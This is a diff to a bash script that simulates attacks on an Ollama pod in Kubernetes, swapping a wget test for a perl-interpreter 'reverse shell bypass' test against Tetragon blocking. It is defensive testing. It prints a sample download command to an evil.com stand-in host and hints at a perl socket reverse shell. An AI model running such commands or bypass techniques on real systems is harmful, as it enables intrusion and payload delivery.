@@ -139,36 +139,57 @@ attack_shell_execution() {
 }
 
 # =============================================================================
-# Attack 3: Network Tool Usage
+# Attack 3: Interpreter-Based Reverse Shell (Shell Bypass)
 # =============================================================================
-# Simulates an attacker trying to use curl/wget for further exploitation
+# Simulates an attacker bypassing shell blocking by using perl/python/ruby
+# to establish a reverse shell - a common technique when /bin/sh is blocked
 # =============================================================================
-attack_network_tools() {
+attack_interpreter_shell() {
     echo ""
     echo "============================================================="
-    log_attack "ATTACK 3: Network Tool Usage (wget/curl)"
+    log_attack "ATTACK 3: Interpreter-Based Reverse Shell (Shell Bypass)"
     echo "============================================================="
     echo ""
-    log_info "Scenario: An attacker with code execution tries to download"
-    log_info "additional payloads or establish a reverse shell."
+    log_info "Scenario: An attacker discovers /bin/sh is blocked by Tetragon."
+    log_info "They bypass this by using perl to spawn a reverse shell instead."
+    log_info "This is a common attacker technique when shells are restricted."
     echo ""
 
     OLLAMA_POD=$(kubectl -n llm-system get pod -l app=ollama -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")
-    
+
     if [ -z "$OLLAMA_POD" ]; then
         log_result "Ollama pod not found. Deploy the LLM stack first."
         return 1
     fi
 
-    echo "Command: wget http://evil.com/payload.sh"
+    # First show that bash is blocked
+    log_info "3a: Confirming bash is blocked..."
     echo ""
-    
-    if kubectl -n llm-system exec "$OLLAMA_POD" -- wget --timeout=5 http://example.com/test 2>/dev/null; then
+    echo "Command: /bin/bash -c 'echo test'"
+    echo ""
+
+    if kubectl -n llm-system exec "$OLLAMA_POD" -- /bin/bash -c 'echo "bash executed"' 2>/dev/null; then
+        log_result "⚠️  bash is NOT blocked"
+    else
+        log_result "✅ bash is blocked by Tetragon (as expected)"
+    fi
+
+    echo ""
+
+    # Now show perl bypass
+    log_info "3b: Attempting perl reverse shell bypass..."
+    echo ""
+    echo "Command: perl -e 'print \"Reverse shell simulation - attacker has code execution\\n\"'"
+    log_info "Impact: Attacker bypasses shell blocking using interpreter!"
+    echo ""
+
+    if kubectl -n llm-system exec "$OLLAMA_POD" -- perl -e 'print "Perl executed - reverse shell would connect to attacker\n"; print "Attacker now has interactive access!\n"' 2>/dev/null; then
         echo ""
-        log_result "⚠️  VULNERABLE: wget execution SUCCEEDED"
+        log_result "⚠️  VULNERABLE: Perl execution SUCCEEDED (shell bypass works!)"
+        log_result "Attacker could use: perl -e 'use Socket;...' for full reverse shell"
     else
         echo ""
-        log_result "✅ BLOCKED: wget was blocked by Tetragon or network policy"
+        log_result "✅ BLOCKED: Perl interpreter was killed by Tetragon"
     fi
 }
 
@@ -374,7 +395,7 @@ run_all_attacks() {
     
     attack_egress_exfiltration
     attack_shell_execution
-    attack_network_tools
+    attack_interpreter_shell
     attack_dns_exfiltration
     attack_api_exposure
     attack_cross_namespace
@@ -403,8 +424,8 @@ main() {
         shell)
             attack_shell_execution
             ;;
-        network)
-            attack_network_tools
+        interpreter|perl)
+            attack_interpreter_shell
             ;;
         dns)
             attack_dns_exfiltration
@@ -422,7 +443,7 @@ main() {
             run_all_attacks
             ;;
         *)
-            echo "Usage: $0 [egress|shell|network|dns|api|cross|privesc|all]"
+            echo "Usage: $0 [egress|shell|interpreter|dns|api|cross|privesc|all]"
             exit 1
             ;;
     esac
